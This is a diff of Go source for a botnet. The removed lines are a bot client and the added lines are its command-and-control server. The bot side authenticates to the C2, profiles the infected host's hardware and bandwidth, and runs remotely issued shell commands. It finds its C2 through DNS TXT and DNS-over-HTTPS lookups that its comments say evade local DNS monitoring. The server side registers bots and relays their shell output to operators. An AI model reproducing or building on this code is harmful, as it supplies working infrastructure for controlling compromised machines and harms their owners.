@@ -7,575 +7,704 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"io"
 	"math/rand"
 	"net"
 	"net/http"
 	"os"
-	"path/filepath"
-	"runtime"
 	"strings"
-	"syscall"
 	"time"
-
-	"github.com/miekg/dns"
 )
 
-// hafnium generates an authentication response for the C2 challenge-response protocol.
-// Algorithm: Base64(MD5(challenge + secret + challenge))
-// Parameters:
-//   - challenge: Random challenge string from C2 server
-//   - secret: Shared magic code (must match C2 server)
-//
-// Returns: Base64-encoded authentication response
-func hafnium(challenge, secret string) string {
-	h := md5.New()
-	h.Write([]byte(challenge + secret + challenge))
-	return base64.StdEncoding.EncodeToString(h.Sum(nil))
-}
+// ============================================================================
+// TLS CONFIGURATION
+// Configures secure TLS 1.2+ encryption for bot-to-CNC communication.
+// Requires server.crt and server.key files generated during setup.
+// Uses modern cipher suites with forward secrecy (ECDHE) for security.
+// ============================================================================
 
-// charmingKitten detects and returns a human-readable architecture string.
-// Maps Go's runtime.GOARCH values to descriptive names.
-// Format: "OS-Architecture" (e.g., "Linux-x64", "Windows-ARM64")
-// Returns: Architecture description string
-func charmingKitten() string {
-	goarch := runtime.GOARCH
-	osName := runtime.GOOS
-	archMap := map[string]string{"386": "x86", "amd64": "x64", "arm": "ARM32", "arm64": "ARM64", "mips": "MIPS", "mips64": "MIPS64", "ppc64": "PowerPC64", "ppc64le": "PowerPC64LE", "s390x": "s390x", "wasm": "WebAssembly"}
-	if arch, exists := archMap[goarch]; exists {
-		if osName == "windows" {
-			if goarch == "amd64" {
-				return "Windows-x64"
-			} else if goarch == "386" {
-				return "Windows-x86"
-			}
-		} else if osName == "linux" {
-			return "Linux-" + arch
-		} else if osName == "darwin" {
-			return "macOS-" + arch
+// loadTLSConfig loads X.509 certificates and configures secure TLS settings
+// Checks both ./cnc/certificates/ (project root) and ./certificates/ (cnc dir)
+// Enforces TLS 1.2 minimum to reject outdated/vulnerable protocols
+// Prefers X25519 and P256 curves for key exchange (modern and fast)
+// Server cipher preference prevents clients from choosing weak ciphers
+// Fatal error if certs missing - CNC cannot operate without encryption
+func loadTLSConfig() *tls.Config {
+	// Try project root path first (./cnc/certificates/), then local path (./certificates/)
+	certPaths := []struct{ cert, key string }{
+		{"./cnc/certificates/server.crt", "./cnc/certificates/server.key"},
+		{"./certificates/server.crt", "./certificates/server.key"},
+	}
+
+	var cert tls.Certificate
+	var err error
+	var loaded bool
+
+	for _, p := range certPaths {
+		cert, err = tls.LoadX509KeyPair(p.cert, p.key)
+		if err == nil {
+			loaded = true
+			break
 		}
-		return arch
-	}
-	return osName + "-" + goarch
-}
-
-// revilMem retrieves total system RAM in megabytes using syscall.
-// Uses Linux sysinfo syscall to get memory information.
-// Returns: Total RAM in MB, or 0 on error
-func revilMem() int64 {
-	var info syscall.Sysinfo_t
-	if err := syscall.Sysinfo(&info); err != nil {
-		return 0
-	}
-	return int64(uint64(info.Totalram) * uint64(info.Unit) / 1024 / 1024)
-}
-
-// revilCPU retrieves total CPU cores using runtime.
-// Returns: Number of CPU cores available to the system
-func revilCPU() int {
-	return runtime.NumCPU()
-}
-
-// revilProc retrieves the running process name.
-// Returns the base name of the executable (e.g., "ethd0", "kworkerd0")
-func revilProc() string {
-	if len(os.Args) > 0 {
-		return filepath.Base(os.Args[0])
-	}
-	return "unknown"
-}
-
-// revilUplink measures approximate uplink/download speed in Mbps.
-// Downloads a small test payload and measures throughput.
-// Uses a 1MB test file from a CDN for quick measurement.
-// Returns: Speed in Mbps (float64), 0.0 on error
-func revilUplink() float64 {
-	// Small test URLs (fast CDNs)
-	testURLs := []string{
-		"http://speed.cloudflare.com/__down?bytes=1000000",
-		"http://speedtest.tele2.net/1MB.zip",
 	}
 
-	client := &http.Client{
-		Timeout: 10 * time.Second,
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	if !loaded {
+		fmt.Printf("[FATAL] Failed to load TLS certificates: %v\n", err)
+		fmt.Println("[FATAL] Make sure server.crt and server.key exist in ./cnc/certificates/ or ./certificates/")
+		os.Exit(1)
+	}
+
+	return &tls.Config{
+		Certificates: []tls.Certificate{cert},
+		MinVersion:   tls.VersionTLS12,
+		CurvePreferences: []tls.CurveID{
+			tls.X25519,    // Modern, fast elliptic curve
+			tls.CurveP256, // Fallback NIST curve
+		},
+		PreferServerCipherSuites: true,
+		CipherSuites: []uint16{
+			// AES-GCM ciphers with SHA-384/256 for authenticated encryption
+			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+			// ChaCha20-Poly1305 for devices without AES hardware acceleration
+			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
+			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
+			// AES-128 variants for lower resource environments
+			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
 		},
 	}
+}
 
-	for _, url := range testURLs {
-		start := time.Now()
-		resp, err := client.Get(url)
-		if err != nil {
-			continue
+// validateTLSHandshake performs TLS security validation on incoming connections
+// Ensures the connection uses TLS 1.2+ (rejects old vulnerable protocols)
+// Validates cipher suite is modern with forward secrecy (ECDHE + AES-GCM/ChaCha20)
+// TLS 1.3 connections auto-accepted (all TLS 1.3 ciphers are secure)
+// Rejects connections that don't meet security standards
+// On success, hands off to handleBotConnection for authentication
+func validateTLSHandshake(conn net.Conn) {
+	defer func() {
+		// Panic recovery to prevent single bad connection from crashing server
+		if r := recover(); r != nil {
+			logMsg("[PANIC] in validateTLSHandshake: %v", r)
+			conn.Close()
 		}
+	}()
 
-		// Read all the data
-		var totalBytes int64
-		buf := make([]byte, 32*1024)
-		for {
-			n, err := resp.Body.Read(buf)
-			totalBytes += int64(n)
-			if err != nil {
+	// Type assert to TLS connection
+	tlsConn, ok := conn.(*tls.Conn)
+	if !ok {
+		return
+	}
+
+	// 10 second deadline for handshake to prevent slow-loris attacks
+	tlsConn.SetDeadline(time.Now().Add(10 * time.Second))
+
+	if err := tlsConn.Handshake(); err != nil {
+		return
+	}
+
+	// Enforce minimum TLS 1.2 - older versions have known vulnerabilities
+	state := tlsConn.ConnectionState()
+	if state.Version < tls.VersionTLS12 {
+		tlsConn.Close()
+		return
+	}
+
+	// Whitelist of acceptable cipher suites with forward secrecy
+	validCiphers := map[uint16]bool{
+		tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:   true,
+		tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256: true,
+		tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:         true,
+		tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:       true,
+		tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:         true,
+		tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:       true,
+		0x1301: true, // TLS_AES_128_GCM_SHA256 (TLS 1.3)
+		0x1302: true, // TLS_AES_256_GCM_SHA384 (TLS 1.3)
+		0x1303: true, // TLS_CHACHA20_POLY1305_SHA256 (TLS 1.3)
+	}
+
+	if state.Version == tls.VersionTLS13 {
+		logMsg("[ACCEPT] TLS 1.3 connection from %s", conn.RemoteAddr())
+	} else if !validCiphers[state.CipherSuite] {
+		tlsConn.Close()
+		return
+	}
+
+	// Reset deadline for authentication phase
+	tlsConn.SetDeadline(time.Time{})
+
+	// Start authentication process (runs in goroutine)
+	go handleBotConnection(conn)
+}
+
+// ============================================================================
+// AUTHENTICATION FUNCTIONS
+// These functions handle the challenge-response authentication between
+// the CNC server and bots. Uses MD5 hashing with the magic code to verify
+// that connecting bots are legitimate.
+// ============================================================================
+
+// generateAuthResponse creates an MD5-based authentication response
+// Takes a random challenge string and the shared secret (magic code)
+// Concatenates challenge + secret + challenge, then MD5 hashes it
+// Returns Base64 encoded hash that must match the bot's response
+// This ensures bots know the magic code without transmitting it in plaintext
+func generateAuthResponse(challenge, secret string) string {
+	h := md5.New()
+	h.Write([]byte(challenge + secret + challenge))
+	response := base64.StdEncoding.EncodeToString(h.Sum(nil))
+	return response
+}
+
+// randomChallenge generates a random alphanumeric string for authentication
+// Creates a unique challenge for each bot connection attempt
+// Uses standard alphanumeric charset (a-z, A-Z, 0-9) for compatibility
+// Length parameter determines challenge complexity (typically 32 chars)
+// Each bot gets a different challenge preventing replay attacks
+func randomChallenge(length int) string {
+	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+	b := make([]byte, length)
+	for i := range b {
+		b[i] = charset[rand.Intn(len(charset))]
+	}
+	return string(b)
+}
+
+// ============================================================================
+// GEOIP LOOKUP
+// Uses ip-api.com free API to resolve country from bot IP address.
+// Falls back to "??" on error. Caches nothing (one lookup per bot connect).
+// ============================================================================
+
+// geoIPResponse holds the JSON response from ip-api.com
+type geoIPResponse struct {
+	Status      string `json:"status"`
+	Country     string `json:"country"`
+	CountryCode string `json:"countryCode"`
+	City        string `json:"city"`
+	ISP         string `json:"isp"`
+}
+
+// lookupGeoIP resolves country code from an IP:port address string.
+// Uses ip-api.com free tier (45 req/min, no key needed).
+// Returns 2-letter country code (e.g., "US", "DE") or "??" on failure.
+func lookupGeoIP(remoteAddr string) string {
+	// Extract IP from IP:port
+	host, _, err := net.SplitHostPort(remoteAddr)
+	if err != nil {
+		host = remoteAddr
+	}
+
+	// Skip private/localhost IPs
+	ip := net.ParseIP(host)
+	if ip == nil || ip.IsLoopback() || ip.IsPrivate() {
+		return "LO"
+	}
+
+	client := &http.Client{Timeout: 5 * time.Second}
+	resp, err := client.Get(fmt.Sprintf("http://ip-api.com/json/%s?fields=status,countryCode,country,city,isp", host))
+	if err != nil {
+		logMsg("[GEO] Lookup failed for %s: %v", host, err)
+		return "??"
+	}
+	defer resp.Body.Close()
+
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return "??"
+	}
+
+	var geo geoIPResponse
+	if err := json.Unmarshal(body, &geo); err != nil {
+		return "??"
+	}
+
+	if geo.Status != "success" {
+		return "??"
+	}
+
+	logMsg("[GEO] %s -> %s (%s, %s - %s)", host, geo.CountryCode, geo.Country, geo.City, geo.ISP)
+	return geo.CountryCode
+}
+
+// ============================================================================
+// BOT MANAGEMENT FUNCTIONS
+// These functions manage the lifecycle of bot connections including
+// registration, removal, cleanup, and tracking of bot metadata.
+// Thread-safe operations using RWMutex for concurrent access.
+// ============================================================================
+
+// addBotConnection registers a newly authenticated bot in the connections map
+// Handles duplicate bot IDs by closing the old connection (prevents stale entries)
+// Stores bot metadata: connection socket, unique ID, architecture, RAM, CPU, timestamps
+// Uses mutex locking for thread-safe map access (multiple bots connect concurrently)
+// Maintains both new map-based storage and legacy slice for backwards compatibility
+func addBotConnection(conn net.Conn, botID string, arch string, ram int64, cpuCores int, processName string, uplinkMbps float64, country string) {
+	botConnsLock.Lock()
+	defer botConnsLock.Unlock()
+
+	// Check for duplicates - if same bot reconnects, close old socket
+	if existing, exists := botConnections[botID]; exists {
+		// Close old connection to prevent zombie sockets
+		if existing.conn != nil {
+			existing.conn.Close()
+		}
+		logMsg("[☾℣☽] Replacing duplicate bot connection: %s (%s)", botID, conn.RemoteAddr())
+	}
+
+	botConn := &BotConnection{
+		conn:          conn,
+		botID:         botID,
+		connectedAt:   time.Now(),
+		lastPing:      time.Now(),
+		authenticated: true,
+		arch:          arch,
+		ip:            conn.RemoteAddr().String(),
+		ram:           ram,
+		cpuCores:      cpuCores,
+		processName:   processName,
+		uplinkMbps:    uplinkMbps,
+		country:       country,
+		userConn:      nil,
+	}
+
+	botConnections[botID] = botConn
+	botConns = append(botConns, conn)
+	botCount++
+
+	// Notify TUI of connection
+	LogBotConnection(arch, true)
+
+	logMsg("[☾℣☽] Bot authenticated: %s | Arch: %s | RAM: %dMB | CPU: %d | Proc: %s | Uplink: %.1fMbps | Country: %s | IP: %s | Total: %d",
+		botID, arch, ram, cpuCores, processName, uplinkMbps, country, conn.RemoteAddr(), botCount)
+}
+
+// removeBotConnection cleanly removes a bot from all tracking structures
+// Closes the network connection to free up system resources
+// Removes from main connections map and decrements global bot count
+// Also cleans up the command origin map (tracks which user sent commands)
+// Removes from legacy botConns slice for backwards compatibility
+// Thread-safe with mutex locking for both maps
+func removeBotConnection(botID string) {
+	botConnsLock.Lock()
+	defer botConnsLock.Unlock()
+
+	if botConn, exists := botConnections[botID]; exists {
+		arch := botConn.arch
+		botConn.conn.Close()
+		delete(botConnections, botID)
+		botCount--
+
+		// Notify TUI of disconnection
+		LogBotConnection(arch, false)
+
+		// Remove from command origin map (tracks user->bot command routing)
+		originLock.Lock()
+		delete(commandOrigin, botID)
+		originLock.Unlock()
+
+		// Remove from legacy list for backwards compatibility
+		for i, conn := range botConns {
+			if conn == botConn.conn {
+				botConns = append(botConns[:i], botConns[i+1:]...)
 				break
 			}
 		}
-		resp.Body.Close()
-
-		elapsed := time.Since(start).Seconds()
-		if elapsed > 0 && totalBytes > 0 {
-			// Convert bytes/sec to Mbps (megabits per second)
-			mbps := (float64(totalBytes) * 8.0) / (elapsed * 1000000.0)
-			deoxys("revilUplink: Downloaded %d bytes in %.2fs = %.2f Mbps", totalBytes, elapsed, mbps)
-			return mbps
-		}
 	}
-
-	deoxys("revilUplink: All speed tests failed")
-	return 0.0
 }
 
-// anonymousSudan handles the entire C2 session lifecycle.
-// Protocol flow:
-//  1. Receive AUTH_CHALLENGE from server
-//  2. Send authentication response (hafnium)
-//  3. Receive AUTH_SUCCESS or disconnect
-//  4. Send REGISTER with bot info (protocol, ID, arch, RAM)
-//  5. Enter command loop (handle PING and commands)
-//
-// Parameters:
-//   - conn: TLS connection to C2 server
-func anonymousSudan(conn net.Conn) {
-	deoxys("anonymousSudan: Starting C2 handler, remote: %s", conn.RemoteAddr())
+// cleanupDeadBots runs as a background goroutine to remove stale connections
+// Checks every 60 seconds for bots that haven't sent a PONG in 5 minutes
+// Dead bots can occur from network issues, bot crashes, or firewall blocks
+// Prevents resource leaks from accumulating zombie connections over time
+// Logs cleanup activity for monitoring and debugging purposes
+func cleanupDeadBots() {
+	ticker := time.NewTicker(60 * time.Second)
+	defer ticker.Stop()
+
+	for range ticker.C {
+		botConnsLock.Lock()
+		now := time.Now()
+		deadBots := []string{}
+
+		// Scan all bots and check last ping timestamp
+		for botID, botConn := range botConnections {
+			// 5 minute timeout - generous to handle network latency
+			if now.Sub(botConn.lastPing) > 5*time.Minute {
+				deadBots = append(deadBots, botID)
+				logMsg("[CLEANUP] Removing dead bot: %s (Last ping: %v ago)",
+					botID, now.Sub(botConn.lastPing))
+			}
+		}
+
+		for _, botID := range deadBots {
+			if botConn, exists := botConnections[botID]; exists {
+				botConn.conn.Close()
+				delete(botConnections, botID)
+				botCount--
+
+				// Clean up from origin map
+				originLock.Lock()
+				delete(commandOrigin, botID)
+				originLock.Unlock()
+			}
+		}
+		botConnsLock.Unlock()
+
+		if len(deadBots) > 0 {
+			logMsg("[CLEANUP] Removed %d dead bots | Total alive: %d", len(deadBots), botCount)
+		}
+	}
+}
+
+// ============================================================================
+// BOT CONNECTION HANDLER
+// Main function that handles the entire lifecycle of a bot connection:
+// 1. Challenge-response authentication to verify bot legitimacy
+// 2. Protocol version verification for compatibility
+// 3. Bot registration with metadata (ID, arch, RAM)
+// 4. Continuous command loop for receiving bot responses and pings
+// 5. Cleanup on disconnect to free resources
+// ============================================================================
+
+// handleBotConnection manages authentication and command routing for a single bot
+// Runs as a goroutine for each incoming bot connection
+// Implements the full authentication handshake protocol
+// Routes shell command output back to the user who issued the command
+// Handles Base64-encoded output for binary-safe transmission
+func handleBotConnection(conn net.Conn) {
+	defer func() {
+		// Cleanup: Find and remove bot from connections map on disconnect
+		botConnsLock.Lock()
+		for botID, botConn := range botConnections {
+			if botConn.conn == conn {
+				delete(botConnections, botID)
+				botCount--
+				logMsg("[☾℣☽] Bot disconnected: %s (%s)", botID, conn.RemoteAddr())
+				break
+			}
+		}
+
+		// Remove from legacy list
+		for i, botConn := range botConns {
+			if botConn == conn {
+				botConns = append(botConns[:i], botConns[i+1:]...)
+				break
+			}
+		}
+		botConnsLock.Unlock()
+
+		conn.Close()
+	}()
+
 	reader := bufio.NewReader(conn)
+	writer := bufio.NewWriter(conn)
+
+	// Step 1: Send authentication challenge
+	challenge := randomChallenge(32)
+	if _, err := writer.WriteString(fmt.Sprintf("AUTH_CHALLENGE:%s\n", challenge)); err != nil {
+		return
+	}
+	writer.Flush()
+
+	logMsg("[AUTH] Sent challenge to %s", conn.RemoteAddr())
+
+	// Step 2: Read bot's response
 	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
-	deoxys("anonymousSudan: Waiting for auth challenge...")
-	challengeMsg, err := reader.ReadString('\n')
+	authResponse, err := reader.ReadString('\n')
 	if err != nil {
-		deoxys("anonymousSudan: Failed to read challenge: %v", err)
-		conn.Close()
+		logMsg("[AUTH] Failed to read auth response from %s: %v", conn.RemoteAddr(), err)
 		return
 	}
-	challengeMsg = strings.TrimSpace(challengeMsg)
-	deoxys("anonymousSudan: Received: %s", challengeMsg)
-	if !strings.HasPrefix(challengeMsg, "AUTH_CHALLENGE:") {
-		deoxys("anonymousSudan: Invalid challenge format, closing")
-		conn.Close()
+
+	authResponse = strings.TrimSpace(authResponse)
+
+	// Step 3: Verify response
+	expectedResponse := generateAuthResponse(challenge, MAGIC_CODE)
+	if authResponse != expectedResponse {
+		logMsg("[AUTH] Invalid auth from %s. Got: %s... Expected: %s...",
+			conn.RemoteAddr(),
+			safeSubstring(authResponse, 0, 10),
+			safeSubstring(expectedResponse, 0, 10))
+		writer.WriteString("AUTH_FAILED\n")
+		writer.Flush()
 		return
 	}
-	challenge := strings.TrimPrefix(challengeMsg, "AUTH_CHALLENGE:")
-	challenge = strings.TrimSpace(challenge)
-	deoxys("anonymousSudan: Challenge extracted: %s", challenge)
-	response := hafnium(challenge, magicCode)
-	deoxys("anonymousSudan: Sending auth response...")
-	conn.Write([]byte(response + "\n"))
+
+	// Step 4: Send success
+	writer.WriteString("AUTH_SUCCESS\n")
+	writer.Flush()
+
+	logMsg("[AUTH] Authentication successful for %s", conn.RemoteAddr())
+
+	// Step 5: Wait for bot registration
 	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
-	authResult, err := reader.ReadString('\n')
-	if err != nil || strings.TrimSpace(authResult) != "AUTH_SUCCESS" {
-		deoxys("anonymousSudan: Auth failed: err=%v, result=%s", err, strings.TrimSpace(authResult))
-		conn.Close()
+	registerMsg, err := reader.ReadString('\n')
+	if err != nil {
+		logMsg("[AUTH] Failed to read registration from %s: %v", conn.RemoteAddr(), err)
 		return
 	}
-	deoxys("anonymousSudan: Authentication successful!")
-	botID := mustangPanda()
-	arch := charmingKitten()
-	ram := revilMem()
-	cpu := revilCPU()
-	procName := revilProc()
-	uplink := revilUplink()
-	deoxys("anonymousSudan: Registering - BotID: %s, Arch: %s, RAM: %d MB, CPU: %d cores, Proc: %s, Uplink: %.2f Mbps",
-		botID, arch, ram, cpu, procName, uplink)
-	conn.Write([]byte(fmt.Sprintf("REGISTER:%s:%s:%s:%d:%d:%s:%.2f\n",
-		protocolVersion, botID, arch, ram, cpu, procName, uplink)))
-	deoxys("anonymousSudan: Entering command loop...")
+
+	registerMsg = strings.TrimSpace(registerMsg)
+
+	// Parse registration message (expected format: "REGISTER:v1.0:botID:arch")
+	if !strings.HasPrefix(registerMsg, "REGISTER:") {
+		logMsg("[AUTH] Invalid registration format from %s: %s", conn.RemoteAddr(), registerMsg)
+		return
+	}
+
+	parts := strings.Split(registerMsg, ":")
+	if len(parts) < 3 {
+		logMsg("[AUTH] Malformed registration from %s: %s", conn.RemoteAddr(), registerMsg)
+		return
+	}
+
+	version := parts[1]
+	botID := parts[2]
+	arch := "unknown"
+	if len(parts) > 3 {
+		arch = parts[3]
+	}
+	// Parse RAM (in MB) - expected format: REGISTER:version:botID:arch:ram:cpu:procname:uplink
+	var ram int64 = 0
+	if len(parts) > 4 {
+		fmt.Sscanf(parts[4], "%d", &ram)
+	}
+	// Parse CPU cores
+	var cpuCores int = 0
+	if len(parts) > 5 {
+		fmt.Sscanf(parts[5], "%d", &cpuCores)
+	}
+	// Parse process name
+	processName := "unknown"
+	if len(parts) > 6 {
+		processName = parts[6]
+	}
+	// Parse uplink speed (Mbps)
+	var uplinkMbps float64 = 0.0
+	if len(parts) > 7 {
+		fmt.Sscanf(parts[7], "%f", &uplinkMbps)
+	}
+
+	// GeoIP lookup from bot's IP
+	country := lookupGeoIP(conn.RemoteAddr().String())
+
+	// Your existing version check
+	if version != PROTOCOL_VERSION {
+		logMsg("[AUTH] Version mismatch from %s: got %s, expected %s",
+			conn.RemoteAddr(), version, PROTOCOL_VERSION)
+		return
+	}
+
+	// Add bot to connections
+	addBotConnection(conn, botID, arch, ram, cpuCores, processName, uplinkMbps, country)
+
+	// Reset deadline for normal operation
+	conn.SetDeadline(time.Time{})
+
+	// Start ping handler
+	stopPing := make(chan struct{})
+	defer close(stopPing)
+	go pingHandler(conn, botID, stopPing)
+
+	// Main bot command loop
 	for {
 		conn.SetReadDeadline(time.Now().Add(180 * time.Second))
-		command, err := reader.ReadString('\n')
+		line, err := reader.ReadString('\n')
 		if err != nil {
-			deoxys("anonymousSudan: Command read error: %v", err)
-			break
-		}
-		command = strings.TrimSpace(command)
-		deoxys("anonymousSudan: Received command: %s", command)
-		if command == "PING" {
-			deoxys("anonymousSudan: Responding to PING")
-			conn.Write([]byte("PONG\n"))
-			continue
-		}
-		deoxys("anonymousSudan: Executing command via blackEnergy...")
-		if err := blackEnergy(conn, command); err != nil {
-			deoxys("anonymousSudan: Command error: %v", err)
-			conn.Write([]byte(fmt.Sprintf("ERROR: %v\n", err)))
-		}
-	}
-	deoxys("anonymousSudan: Connection closed")
-	conn.Close()
-}
-
-// ============================================================================
-
-// DNS RESOLUTION FUNCTIONS
-// These functions implement multi-method C2 address resolution for resilience.
-// Resolution order: DoH TXT -> TXT record -> A record -> Direct IP
-// ============================================================================
-
-// darkrai performs DNS TXT record lookup to retrieve C2 address.
-// Queries multiple DNS servers (Cloudflare, Google, Quad9, OpenDNS) for redundancy.
-// Supports TXT record formats: "c2=IP:PORT", "ip=IP:PORT", raw "IP:PORT", plain IP
-// Parameters:
-//   - domain: Domain to query for TXT records
-//
-// Returns: C2 address string (IP:PORT) or error
-func darkrai(domain string) (string, error) {
-	deoxys("darkrai: Looking up TXT for domain: %s", domain)
-	servers := make([]string, len(lizardSquad))
-	copy(servers, lizardSquad)
-	rand.Shuffle(len(servers), func(i, j int) {
-		servers[i], servers[j] = servers[j], servers[i]
-	})
-	var lastErr error
-	for _, server := range servers {
-		deoxys("darkrai: Trying DNS server: %s", server)
-		c := new(dns.Client)
-		c.Timeout = 5 * time.Second
-		c.Net = "udp"
-		m := new(dns.Msg)
-		m.SetQuestion(dns.Fqdn(domain), dns.TypeTXT)
-		m.RecursionDesired = true
-		r, rtt, err := c.Exchange(m, server)
-		if err != nil {
-			deoxys("darkrai: DNS error from %s: %v", server, err)
-			lastErr = err
-			continue
-		}
-		deoxys("darkrai: Got response from %s in %v, rcode=%d, answers=%d", server, rtt, r.Rcode, len(r.Answer))
-		if r.Rcode != dns.RcodeSuccess {
-			lastErr = fmt.Errorf("DNS query failed with code: %d", r.Rcode)
-			deoxys("darkrai: Bad rcode: %d", r.Rcode)
-			continue
-		}
-		for _, ans := range r.Answer {
-			deoxys("darkrai: Answer type: %T, value: %v", ans, ans)
-			if txt, ok := ans.(*dns.TXT); ok {
-				deoxys("darkrai: TXT record found with %d strings", len(txt.Txt))
-				for _, t := range txt.Txt {
-					deoxys("darkrai: TXT value: '%s'", t)
-					t = strings.TrimSpace(t)
-					if strings.HasPrefix(t, "c2=") {
-						result := strings.TrimPrefix(t, "c2=")
-						deoxys("darkrai: Found c2= prefix, returning: %s", result)
-						return result, nil
-					}
-					if strings.HasPrefix(t, "ip=") {
-						result := strings.TrimPrefix(t, "ip=")
-						deoxys("darkrai: Found ip= prefix, returning: %s", result)
-						return result, nil
-					}
-					// Try raw IP:port format
-					if strings.Contains(t, ":") && !strings.Contains(t, " ") {
-						parts := strings.Split(t, ":")
-						if len(parts) == 2 {
-							if net.ParseIP(parts[0]) != nil || arceus(parts[0]) {
-								deoxys("darkrai: Found raw IP:port, returning: %s", t)
-								return t, nil
-							}
-						}
-					}
-					// Try plain IP address (no port) - append default 443
-					if net.ParseIP(t) != nil {
-						result := t + ":443"
-						deoxys("darkrai: Found plain IP, appending :443, returning: %s", result)
-						return result, nil
-					}
-				}
-			}
-		}
-		lastErr = fmt.Errorf("no valid C2 address in TXT records")
-		deoxys("darkrai: No valid C2 found in TXT records from %s", server)
-	}
-	deoxys("darkrai: All servers failed, last error: %v", lastErr)
-	return "", lastErr
-}
-
-// palkia performs DNS-over-HTTPS (DoH) TXT record lookup.
-// DoH encrypts DNS queries, bypassing local DNS filtering/monitoring.
-// Tries Cloudflare, Google, and Quad9 DoH servers in sequence.
-// Parameters:
-//   - domain: Domain to query for TXT records via DoH
-//
-// Returns: C2 address string (IP:PORT) or error
-func palkia(domain string) (string, error) {
-	deoxys("palkia: Starting DoH TXT lookup for: %s", domain)
-	dohServers := []string{
-		"https://cloudflare-dns.com/dns-query",
-		"https://dns.google/dns-query",
-		"https://dns.quad9.net/dns-query",
-	}
-	for _, server := range dohServers {
-		dohURL := fmt.Sprintf("%s?name=%s&type=TXT", server, domain)
-		deoxys("palkia: Trying DoH server: %s", dohURL)
-		req, err := http.NewRequest("GET", dohURL, nil)
-		if err != nil {
-			deoxys("palkia: Request create error: %v", err)
-			continue
-		}
-		req.Header.Set("Accept", "application/dns-json")
-		client := &http.Client{Timeout: 10 * time.Second}
-		resp, err := client.Do(req)
-		if err != nil {
-			deoxys("palkia: Request error: %v", err)
-			continue
-		}
-		deoxys("palkia: Got response status: %d", resp.StatusCode)
-		if resp.StatusCode != http.StatusOK {
-			resp.Body.Close()
-			continue
-		}
-		var dnsResp struct {
-			Status int `json:"Status"`
-			Answer []struct {
-				Type int    `json:"type"`
-				Data string `json:"data"`
-			} `json:"Answer"`
-		}
-		if err := json.NewDecoder(resp.Body).Decode(&dnsResp); err != nil {
-			deoxys("palkia: JSON decode error: %v", err)
-			resp.Body.Close()
-			continue
-		}
-		resp.Body.Close()
-		deoxys("palkia: DNS status=%d, answers=%d", dnsResp.Status, len(dnsResp.Answer))
-		for _, ans := range dnsResp.Answer {
-			deoxys("palkia: Answer type=%d data='%s'", ans.Type, ans.Data)
-			// TXT records are type 16
-			if ans.Type != 16 {
+			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
+				// Timeout - send ping
+				writer.WriteString("PING\n")
+				writer.Flush()
 				continue
 			}
-			data := strings.Trim(ans.Data, "\"")
-			data = strings.TrimSpace(data)
-			deoxys("palkia: Parsed TXT data: '%s'", data)
-			if strings.HasPrefix(data, "c2=") {
-				result := strings.TrimPrefix(data, "c2=")
-				deoxys("palkia: Found c2=, returning: %s", result)
-				return result, nil
+			break
+		}
+
+		line = strings.TrimSpace(line)
+
+		// Update last ping time
+		if line == "PONG" {
+			botConnsLock.Lock()
+			if botConn, exists := botConnections[botID]; exists {
+				botConn.lastPing = time.Now()
 			}
-			if strings.HasPrefix(data, "ip=") {
-				result := strings.TrimPrefix(data, "ip=")
-				deoxys("palkia: Found ip=, returning: %s", result)
-				return result, nil
-			}
-			if strings.Contains(data, ":") && !strings.Contains(data, " ") {
-				parts := strings.Split(data, ":")
-				if len(parts) == 2 {
-					deoxys("palkia: Found raw IP:port, returning: %s", data)
-					return data, nil
+			botConnsLock.Unlock()
+			continue
+		}
+
+		// Handle Base64 encoded output from shell commands
+		if strings.HasPrefix(line, "OUTPUT_B64:") {
+			// Extract the Base64 string
+			b64Str := strings.TrimPrefix(line, "OUTPUT_B64:")
+			b64Str = strings.TrimSpace(b64Str)
+
+			// Decode Base64
+			decoded, err := base64.StdEncoding.DecodeString(b64Str)
+			if err != nil {
+				logMsg("[BOT-%s] Failed to decode Base64 output: %v", botID, err)
+			} else {
+				// Format the decoded output nicely
+				output := string(decoded)
+
+				// Forward to TUI if active
+				if tuiMode && tuiProgram != nil {
+					tuiProgram.Send(ShellOutputMsg{BotID: botID, Output: output})
+				} else {
+					// Only print to console if not in TUI mode
+					logMsg("[BOT-%s] Shell Output (%d bytes)", botID, len(decoded))
+				}
+
+				// Check if we should forward this to a user
+				originLock.RLock()
+				userConn, hasUser := commandOrigin[botID]
+				originLock.RUnlock()
+
+				if hasUser && userConn != nil {
+					// Send formatted output to user
+					forwardBotResponseToUser(botID, output, userConn)
+
+					// Clear the origin after sending response
+					originLock.Lock()
+					delete(commandOrigin, botID)
+					originLock.Unlock()
 				}
 			}
-			// Try plain IP address (no port) - append default 443
-			if net.ParseIP(data) != nil {
-				result := data + ":443"
-				deoxys("palkia: Found plain IP, appending :443, returning: %s", result)
-				return result, nil
-			}
-		}
-	}
-	deoxys("palkia: All DoH servers failed")
-	return "", fmt.Errorf("DoH TXT lookup failed")
-}
-
-// rayquaza performs DNS A record lookup as a fallback method.
-// First tries system resolver, then falls back to DoH A record queries.
-// Used when TXT record lookups fail (domain points directly to C2 server).
-// Parameters:
-//   - domain: Domain to resolve to IP address
-//
-// Returns: IP address string or error
-func rayquaza(domain string) (string, error) {
-	deoxys("rayquaza: A record fallback for: %s", domain)
-	// Try system resolver first
-	ips, err := net.LookupHost(domain)
-	if err == nil && len(ips) > 0 {
-		deoxys("rayquaza: System resolver returned: %s", ips[0])
-		return ips[0], nil
-	}
